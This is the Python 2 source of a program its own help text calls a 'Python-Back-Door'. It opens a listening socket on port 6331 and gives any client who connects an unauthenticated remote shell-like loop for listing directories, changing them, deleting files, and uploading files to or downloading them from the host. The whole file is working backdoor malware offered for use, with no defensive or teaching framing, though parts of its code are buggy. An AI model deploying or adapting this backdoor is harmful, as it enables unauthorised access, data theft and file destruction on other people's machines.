#!/usr/bin/python2.7
# -*- coding:utf-8 -*-
#
__doc__ = """
# Name    :  Back-Door-Server
# Author  :  Shinukami
# Date    :  2016-3-12
# Version :  0.0.3
"""

import os, socket, sys, struct

class BackDoorServer(object):

    def __init__(self):
        self.host = ""
        self.port = 6331
        self.BUFSIZE = 1024

        self.FILEINFO_SIZE=struct.calcsize('128s1s1I')
        self.DATAINFO_SIZE=struct.calcsize('1024s')

        self.Server = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        self.Server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.Server.bind((self.host, self.port))
        self.Server.listen(2)

        self.Shell_command = ["upload","download","ls","cd","pwd","delete"]


    def HELP(self):
        HELP_doc = __doc__ + """
            This is a Python-Back-Door. Here are some commands:

            help        : Show this document
            ls          : List current directory
            cd          : Change the shell working directory
            pwd         : Print the current directory
            delete      : Delete a file
            upload      : Upload a file to the Server
            download    : Download a file to the remote PC
        """
        HELP_doc = struct.pack('1024s',HELP_doc)
        self.Clientsock.send(HELP_doc)

    def Upload(self,filename):
        f = open(filename,'rb')
        f.close()
        size = os.stat(filename).st_size
        fhead=struct.pack('128s1s1I',filename,'|',size)
        self.Clientsock.send(fhead)
        try:
            while 1:
                Upload_Data = f.read(self.BUFSIZE)
                if not Upload_Data:break
                sent = self.Clientsock.send(Upload_Data)
            f.close()
        except Exception as error_code:
            print "Exception occur : %s"%(error_code, filename)

    def Download(self, filename):
        fhead = self.Clientsock.recv(self.FILEINFO_SIZE)
        filename,temp1,filesize=struct.unpack('128s1s1I',fhead)
        restsize = filesize
        f = open(filename.strip('\00'),"wb")
        data = ""
        while True:
            if restsize > self.BUFSIZE:
                Download_Data = self.Clientsock.recv(self.BUFSIZE)
            else:
                Download_Data = self.Clientsock.recv(restsize)
            if not Download_Data:break
            data += Download_Data
            restsize = restsize-len(Download_Data)
            if restsize == 0:break
        f.write(data)
        f.close()

    def Delete(self, filename):
        try:
            os.remove(filename)
        except Exception as e:
            self.Clientsock.send(struct.pack('1024s',e))
        self.Clientsock.send(struct.pack('1024s','Delete Succeed !'))

    def LS(self, PATH='.'):
        data = ""
        for each in os.listdir(PATH):
            data += each +"\n"
        data = struct.pack('1024s',data.strip('\n'))
        self.Clientsock.send(data)

    def PWD(self):
        self.Clientsock.send(struct.pack('1024s',os.getcwd()))

    def CD(self, PATH='.'):
        try:
            os.chdir(PATH)
        except Exception as e:
            self.Clientsock.send(struct.pack('1024s',e))
        else:
            self.Clientsock.send(struct.pack('1024s','\n'))

    def BackShell(self):
        while 1:
            Pre_shell = """[BackDoor@Shell %s]"""%(os.getcwd().split("/")[-1])
            Pre_shell = struct.pack('1024s',Pre_shell)
            self.Clientsock.send(Pre_shell)
            CMD = self.Clientsock.recv(self.DATAINFO_SIZE)
            CMD = struct.unpack('1024s',CMD)[0].strip('\00')
            CMD = CMD.split(" ")
            if CMD[0] == "download":
                self.Upload(CMD[1])
            elif CMD[0] == "upload":
                self.Download(CMD[1])
            elif CMD[0] == "ls":
                self.LS()
            elif CMD[0] == "cd":
                self.CD(CMD[1])
            elif CMD[0] == "pwd":
                self.PWD()
            elif CMD[0] == "delete":
                self.Delete(CMD[1])
            else :
                self.HELP()

    def Start(self):
        while 1:
            try:
                self.Clientsock, self.Clientaddr = self.Server.accept()

            except Exception as e:
                print "ERROR : %s"%(e)
                self.Clientsock.close()
            try:
                self.BackShell()
            except Exception as e:
                print "ERROR : %s"%(e)
            finally:
                self.Clientsock.close()

if __name__ == "__main__":
    Server = BackDoorServer()
    Server.Start()
